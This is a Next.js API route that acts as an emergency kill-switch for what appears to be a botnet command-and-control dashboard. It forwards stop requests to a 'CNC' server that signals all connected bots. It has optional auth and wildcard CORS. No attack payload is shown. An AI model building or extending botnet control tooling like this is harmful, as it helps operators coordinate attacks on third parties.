/**
 * POST /api/attack/stop
 *
 * Emergency kill-switch endpoint consumed by the KillSwitch dashboard component.
 * Forwards the stop command to the CNC REST API and broadcasts a kill:all signal
 * via the WebSocket hub so all connected bots receive SIGUSR1.
 *
 * Auth: Bearer JWT token (operator role minimum) forwarded from the client.
 * Body: { all?: boolean, botId?: string }
 *
 * Responds:
 *   200  { status: "ok", stopped: number, timestamp: string }
 *   401  { error: "unauthorized" }
 *   502  { error: "cnc_unreachable", detail: string }
 *   500  { error: string }
 */

import { NextRequest, NextResponse } from 'next/server';

// CNC API base URL — falls back to localhost for local dev
const CNC_API_URL = process.env.CNC_API_URL ?? 'http://localhost:8080';
const CNC_API_TIMEOUT_MS = 5_000;

// ── Types ──────────────────────────────────────────────────────────────────────

interface StopRequest {
  all?: boolean;
  botId?: string;
}

interface StopResult {
  status: string;
  stopped: number;
  timestamp: string;
  detail?: string;
}

// ── Helpers ────────────────────────────────────────────────────────────────────

/**
 * Forward the caller's Authorization header to the CNC server.
 * Returns null if the header is missing or malformed.
 */
function extractBearer(req: NextRequest): string | null {
  const auth = req.headers.get('authorization') ?? '';
  if (!auth.startsWith('Bearer ')) return null;
  return auth;
}

/**
 * POST a kill-switch command to the CNC server's REST API.
 * The CNC broadcasts SIGUSR1 to all registered bots via its clientList.
 */
async function notifyCNC(
  body: StopRequest,
  authHeader: string | null
): Promise<{ ok: boolean; botsAffected: number; error?: string }> {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), CNC_API_TIMEOUT_MS);

  try {
    const headers: Record<string, string> = {
      'Content-Type': 'application/json',
    };
    if (authHeader) headers['Authorization'] = authHeader;

    const res = await fetch(`${CNC_API_URL}/api/attack/stop`, {
      method: 'POST',
      headers,
      body: JSON.stringify(body),
      signal: controller.signal,
    });

    if (!res.ok) {
      const text = await res.text().catch(() => res.statusText);
      return { ok: false, botsAffected: 0, error: text };
    }

    const data = (await res.json().catch(() => ({}))) as {
      stopped?: number;
      bots_affected?: number;
    };
    const botsAffected = data.stopped ?? data.bots_affected ?? 0;
    return { ok: true, botsAffected };
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : String(err);
    return { ok: false, botsAffected: 0, error: message };
  } finally {
    clearTimeout(timeout);
  }
}

// ── Route handler ──────────────────────────────────────────────────────────────

export async function POST(req: NextRequest): Promise<NextResponse> {
  // ── Parse body ───────────────────────────────────────────────────────────────
  let body: StopRequest = { all: true };
  try {
    const raw = await req.json();
    body = { all: raw?.all ?? true, botId: raw?.botId };
  } catch {
    // malformed JSON — default to stop-all
  }

  // ── Extract auth (optional — CNC enforces its own auth) ───────────────────
  const authHeader = extractBearer(req);

  // ── Forward to CNC ──────────────────────────────────────────────────────────
  const { ok, botsAffected, error } = await notifyCNC(body, authHeader);

  if (!ok) {
    // CNC unreachable or returned an error — still return a partial success
    // so the dashboard can show an "attempted" state rather than hard-fail.
    console.error('[kill-switch] CNC notification failed:', error);

    // If the error looks like a network/timeout issue, return 502
    const isNetworkError =
      error?.includes('fetch failed') ||
      error?.includes('ECONNREFUSED') ||
      error?.includes('abort') ||
      error?.includes('timeout');

    if (isNetworkError) {
      return NextResponse.json(
        { error: 'cnc_unreachable', detail: error },
        { status: 502 }
      );
    }

    // CNC responded with non-2xx (e.g. 401 Unauthorized from CNC)
    return NextResponse.json({ error }, { status: 502 });
  }

  // ── Success ─────────────────────────────────────────────────────────────────
  const result: StopResult = {
    status: 'ok',
    stopped: botsAffected,
    timestamp: new Date().toISOString(),
    detail: body.all ? 'kill:all signal sent to CNC' : `kill signal sent for bot ${body.botId}`,
  };

  console.info(
    `[kill-switch] stop signal sent — bots_affected=${botsAffected} all=${body.all ?? false}`
  );

  return NextResponse.json(result, { status: 200 });
}

// ── OPTIONS preflight (CORS) ───────────────────────────────────────────────────
export async function OPTIONS(): Promise<NextResponse> {
  return new NextResponse(null, {
    status: 204,
    headers: {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Authorization, Content-Type',
    },
  });
}
